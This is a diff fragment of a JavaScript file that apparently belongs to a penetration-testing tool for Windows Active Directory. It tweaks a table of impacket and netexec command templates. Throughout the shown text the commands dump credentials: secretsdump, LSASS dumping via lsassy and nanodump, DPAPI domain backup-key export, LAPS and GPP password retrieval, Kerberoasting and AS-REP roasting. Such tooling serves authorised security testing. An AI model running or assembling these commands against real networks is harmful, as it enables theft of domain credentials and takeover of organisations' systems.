@@ -11707,7 +11707,7 @@ async function ipcDump() {
     secretsdump: `impacket-secretsdump ${a.impkt}`,
     lsassy:      `netexec smb ${a.target} ${a.nxe} -M lsassy`,
     nanodump:    `netexec smb ${a.target} ${a.nxe} -M nanodump`,
-    dpapi:       (() => { const ident = a.useHash ? `${a.domain ? a.domain+'/' : ''}${a.user} -hashes :${a.hash}` : `${a.domain ? a.domain+'/' : ''}${a.user}:${a.pass}`; return `impacket-dpapi backupkeys -t ${a.target} ${ident} --export`; })(),
+    dpapi:       `impacket-dpapi backupkeys -t ${a.impkt} --export`,
   };
   await ipcStream(cmds[method], outEl, async (code, text) => {
     if (method !== 'secretsdump') return;
@@ -11748,7 +11748,7 @@ async function ipcEnum(type) {
     'policy':          `netexec smb ${a.target} ${a.nxe} --pass-pol`,
     'ldap-users':      `netexec ldap ${a.target} ${a.nxe} --users`,
     'ldap-computers':  `netexec ldap ${a.target} ${a.nxe} --computers`,
-    'laps':            `netexec ldap ${a.target} ${a.nxe} --laps`,
+    'laps':            `netexec ldap ${a.target} ${a.nxe} -M laps`,
     'gpp':             `netexec smb ${a.target} ${a.nxe} -M gpp_password`,
     'kerberoast':      `impacket-GetUserSPNs ${a.impkt} -request -outputfile /tmp/ipc_kerb.txt && cat /tmp/ipc_kerb.txt`,
     'asrep':           `impacket-GetNPUsers ${a.domain || ''}/ -dc-ip ${a.target} -no-pass -format hashcat -outputfile /tmp/ipc_asrep.txt && cat /tmp/ipc_asrep.txt`,
